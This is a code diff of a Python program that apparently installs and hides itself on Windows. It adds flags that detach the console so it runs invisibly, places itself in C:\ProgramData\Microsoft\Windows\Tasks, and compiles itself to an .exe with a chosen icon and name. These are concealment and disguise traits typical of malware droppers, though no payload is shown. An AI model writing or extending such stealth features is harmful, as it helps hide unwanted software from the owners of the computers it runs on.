@@ -8,8 +8,18 @@ import time
 import sys
 import os
 
-if "--hidewindow" in sys.argv:
-    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+parser = argparse.ArgumentParser()
+parser.add_argument('--file', type=str, default=None)
+parser.add_argument('--icon', type=str, default=None)
+parser.add_argument('--name', type=str, default=None)
+parser.add_argument('--hidewindow', action='store_true')
+parser.add_argument('--updater', action='store_true')  # legacy
+args, _ = parser.parse_known_args()
+        
+if (args.hidewindow or args.updater) and ctypes.windll.kernel32.GetConsoleWindow():
+    ctypes.windll.kernel32.FreeConsole()
+
+del _
 
 target_dir = r"C:\ProgramData\Microsoft\Windows\Tasks" # can be where ever the fuck you want, as long as it will be able to access it
 printnonerrors = False
@@ -28,12 +38,6 @@ os.chdir(SCRIPT_DIR)
 
 try:
     if os.path.splitext(sys.argv[0])[1].lower() != ".exe":  # Compile if running as .py
-        parser = argparse.ArgumentParser()
-        parser.add_argument('--file', type=str, default=None)
-        parser.add_argument('--icon', type=str, default=None)
-        parser.add_argument('--name', type=str, default=None)
-        args = parser.parse_args()
-        
         if args.icon is not None:
             installer_icon = f'--icon "{args.icon}"'
         else:
